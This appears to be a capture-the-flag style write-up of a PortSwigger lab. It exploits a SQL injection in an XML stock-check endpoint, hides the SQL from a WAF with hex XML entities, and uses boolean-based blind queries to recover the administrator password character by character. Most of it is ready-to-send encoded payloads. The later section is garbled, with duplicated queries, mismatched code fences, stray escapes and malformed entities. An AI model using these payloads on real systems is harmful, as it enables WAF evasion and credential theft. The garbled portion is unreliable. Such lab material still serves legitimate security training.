# SQL injection with filter bypass via XML encoding

This lab contains a SQL injection vulnerability in the stock-check
functionality. The query result is reflected in the application's
response, making UNION-style extraction possible.

The database contains a `users` table with usernames and passwords. The
objective is to retrieve the administrator credentials and use them to
log in.

A WAF blocks requests containing obvious SQL injection patterns, so the
SQL syntax must be obfuscated. The lab recommends using the Hackvertor
extension for the encoding step.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

<img width="852" height="523" alt="1" src="https://github.com/user-attachments/assets/39ab42b4-a755-4cc5-88c9-722c097edad1" />


------------------------------------------------------------------------

The following XML payload executes `(SELECT 1)`. Its result is
equivalent to sending `productId` 1 and `storeId` 1:

    <?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            (&#x53;ELECT 1)
        </productId>
        <storeId>
            (&#x53;ELECT 1)
        </storeId>
    </stockCheck>

<img width="338" height="140" alt="2" src="https://github.com/user-attachments/assets/24a7ad9e-6993-4618-b11b-6b834fbf55b7" />


<img width="340" height="156" alt="3" src="https://github.com/user-attachments/assets/3cd2b169-d967-4c5f-8a0f-f91214f26934" />


The SQL can be HTML-encoded to make the request less obvious to the
filter. The complete encoded form of `(SELECT 1)` is:

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x31;)

The next test uses a conditional expression:

    SELECT CASE WHEN (1=1) THEN 1 ELSE 2 END

The XML-encoded form is:

    <productId>
    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x31;&#x3d;&#x31;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;&#x0a;)
    </productId>

<img width="339" height="152" alt="4" src="https://github.com/user-attachments/assets/17071050-a999-49aa-8e2c-84d5e4c5f459" />


The same technique can be used to determine the database version:

    SELECT CASE WHEN (substring((SELECT version()),1,1)='a') THEN 1 ELSE 2 END

The request is sent to Intruder with a delay between requests.

<img width="447" height="241" alt="5" src="https://github.com/user-attachments/assets/da0c3a1b-c77b-484c-a930-fcd7c943647a" />


The first character of the version is identified as `P`.

<img width="496" height="221" alt="6" src="https://github.com/user-attachments/assets/24b103c6-ee40-48ab-9f3c-a10502549afc" />


The next character is `o`.

<img width="522" height="220" alt="7" src="https://github.com/user-attachments/assets/c898812b-8124-464e-adbf-0d80f66e3a7c" />


The version is confirmed as PostgreSQL:

    SELECT CASE WHEN (substring((SELECT version()),1,10)='PostgreSQL') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x28;&#x29;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x30;&#x29;&#x3d;&#x27;&#x50;&#x6f;&#x73;&#x74;&#x67;&#x72;&#x65;&#x53;&#x51;&#x4c;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

<img width="350" height="153" alt="8" src="https://github.com/user-attachments/assets/838458ad-2ba5-4cd9-bf1e-eef40d2fab1a" />


The next check identifies whether a `users` table exists:

    SELECT CASE WHEN (substring((SELECT table_name FROM information_schema.tables limit 1),1,5)='users') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x73;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x35;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

The response is the same as sending the value `1`, confirming that the
`users` table exists.

<img width="339" height="152" alt="9" src="https://github.com/user-attachments/assets/fe9b626e-ccb5-41a3-9710-c4590aa226a8" />


The first column name is then identified from the `users` table:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,1)='a') THEN 1 ELSE 2 END

    (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;AAAAAAAA&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;)

The first character is `u`, suggesting that the column begins with
`user`.

<img width="467" height="226" alt="10" src="https://github.com/user-attachments/assets/09d160f1-5603-4f8b-85a3-a054f46c7d7f" />


The first four characters are confirmed as `user`:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,4)='user') THEN 1 ELSE 2 END

    &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x34;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;

The next character is `n`, so the column is likely `username`.

<img width="345" height="158" alt="11" src="https://github.com/user-attachments/assets/8c6beef8-4de2-482c-a582-17263dbc93c4" />


The complete first column name is verified as `username`:

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,5)='userZ') THEN 1 ELSE 2 END

    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,8)='username') THEN 1 ELSE 2 END

    &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72;&#x73;&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31;&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
    ``` text
    SELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' and column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END

SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = 'users' limit
1),1,9)='usernameZ') THEN 1 ELSE 2 END

``` text
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x69;&#x6e;&#x66;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x5f;&#x73;&#x63;&#x68;&#x65;&#x6d;&#x61;&#x2e;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x61;&#x62;&#x6c;&#x65;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x75;&#x73;&#x65;&#x72&#x27;&#x73&#x27;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x63;&#x6f;&#x6c;&#x75;&#x6d;&#x6e;&#x5f;&#x6e;&#x61;&#x6d;&#x65;&#x21;&#x3d;&#x27;&#x75;&#x73;&#x65;&#x72&#x6e;&#x61&#x6d;&#x65&#x27;&#x20;&#x6c;&#x69;&#x6d;&#x69;&#x74;&#x20;&#x31&#x29;&#x2c;&#x31;&#x2c;&#x38;&#x29;&#x3d;&#x27;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = 'users' and
column_name!='username' limit 1),1,8)='password') THEN 1 ELSE 2 END
`\nSELECT CASE WHEN (substring((SELECT column_name FROM information_schema.columns where table_name = 'users' limit 1),1,9)='usernameZ') THEN 1 ELSE 2 END\n`
SELECT CASE WHEN (substring((SELECT column_name FROM
information_schema.columns where table_name = \'users\' and
column_name!=\'username\' limit 1),1,8)=\'password\') THEN 1 ELSE 2 END

``` text
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END
```

SELECT CASE WHEN (substring((SELECT password FROM users where username =
'administrator'),1,1)='a') THEN 1 ELSE 2 END

``` text
&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```

The first character is identified as `h`.

<img width="341" height="155" alt="15" src="https://github.com/user-attachments/assets/4fe916c1-d446-4dfb-a25c-159e3ba5f4f3" />


The remaining characters can be tested in the same manner until the
administrator password is recovered.

<img width="470" height="186" alt="16" src="https://github.com/user-attachments/assets/8733b47f-948b-4465-913e-07a27d6c251b" />


The final result is shown here.

<img width="1111" height="412" alt="17" src="https://github.com/user-attachments/assets/ec474902-2f5c-4475-b2f6-27b31116d3f6" />

